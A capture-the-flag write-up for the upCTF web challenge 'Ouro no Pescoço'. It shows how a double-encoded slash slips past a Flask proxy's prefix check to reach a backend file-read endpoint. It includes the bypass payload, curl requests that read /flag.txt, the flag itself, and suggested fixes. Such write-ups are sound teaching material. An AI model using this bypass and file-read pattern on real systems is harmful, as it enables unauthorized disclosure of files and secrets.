# upCTF — Ouro no Pescoço

**Category:** Web
**Points:** 331
**Author:** castilho
**Solves:** 14
**Flag:** `upCTF{g0ld_ch41n_0f_l1ttl3_vuln3r4b1l1t13s}`

---

## Challenge Description

> Do you like gold? If you love gold then check our website where we give an evaluation on how much gold a website contains!
>
> Note: When you have local solve, open ticket for an instance.

The challenge provided a Dockerized application consisting of multiple components:

* **Flask frontend** (API proxy)
* **Quarkus backend**
* **Puppeteer bot**
* **flag.txt** inside the container

Participants were required to **solve the vulnerability locally first** and then request a remote instance from the organizers.

---

# Application Architecture

The provided application consisted of two main services:

### Flask Frontend

Acts as an API proxy.

Example route:

```
/api/<subpath>
```

This endpoint forwards requests to the Quarkus backend.

---

### Quarkus Backend

Contains a logging endpoint:

```
/logger/read?file=<path>
```

The endpoint reads the requested file from the filesystem.

Relevant code (simplified):

```java
@Path("/logger")
public class LoggerResource {

    @GET
    @Path("/read")
    public String read(@QueryParam("file") String file) {
        return Files.readString(Path.of(file));
    }
}
```

This creates a **potential arbitrary file read** vulnerability.

However, the Flask proxy attempted to restrict access.

---

# Vulnerability Analysis

Inside the Flask proxy (`app.py`) the following logic was implemented:

```python
subpath = os.path.normpath(unquote(subpath))

if subpath.startswith("logger/read"):
    # authentication required
```

The intention was to block unauthenticated access to the backend endpoint:

```
logger/read
```

However, the path handling was flawed.

The proxy:

1. **Decodes the URL once**
2. **Normalizes the path**
3. **Checks prefix with `startswith()`**

This allowed a **double-encoded path bypass**.

---

# Authentication Bypass

By sending a **double-encoded slash**:

```
%252F
```

The decoding process becomes:

```
%252F  →  %2F  →  /
```

Payload used:

```
%252Flogger%252Fread
```

After one decode inside Flask:

```
/logger/read
```

But the check expects:

```
logger/read
```

Because the string begins with `/`, the condition:

```
startswith("logger/read")
```

returns **false**, bypassing the protection.

The proxy still forwards the request to the backend as:

```
/logger/read
```

Thus the protected endpoint becomes accessible.

---

# Arbitrary File Read

Once the endpoint is reachable, we can control the `file` parameter:

```
/logger/read?file=<path>
```

This allows reading arbitrary files on the server.

The Dockerfile copies the flag into:

```
/flag.txt
```

Therefore we can retrieve it directly.

---

# Exploit

Payload:

```
/api/%252Flogger%252Fread?file=/flag.txt
```

### Example Request

```bash
curl "http://TARGET/api/%252Flogger%252Fread?file=/flag.txt"
```

---

# Proof of Concept

Remote instance exploit:

```bash
curl "http://46.225.117.62:20013/api/%252Flogger%252Fread?file=/flag.txt"
```

Response:

```
upCTF{g0ld_ch41n_0f_l1ttl3_vuln3r4b1l1t13s}
```

---

# Root Cause

The vulnerability chain consists of multiple small issues:

1. Improper path validation using `startswith`
2. URL decoding before validation
3. Inconsistent path handling between proxy and backend
4. Backend endpoint allowing unrestricted file reads

Together these form a **bug chain leading to arbitrary file disclosure**.

---

# Impact

An attacker can read arbitrary files from the server, including:

```
/flag.txt
/etc/passwd
/application secrets
```

This results in full **information disclosure**.

---

# Fix

Possible fixes include:

* Validate paths **after full normalization**
* Reject paths starting with `/`
* Use strict route matching instead of `startswith`
* Restrict file access on the backend

Example fix:

```python
if subpath.lstrip("/").startswith("logger/read"):
```

or enforce authentication before forwarding.

---

# Final Flag

```
upCTF{g0ld_ch41n_0f_l1ttl3_vuln3r4b1l1t13s}
```

---

⭐ Nice challenge demonstrating how **small vulnerabilities chained together can lead to full compromise.**
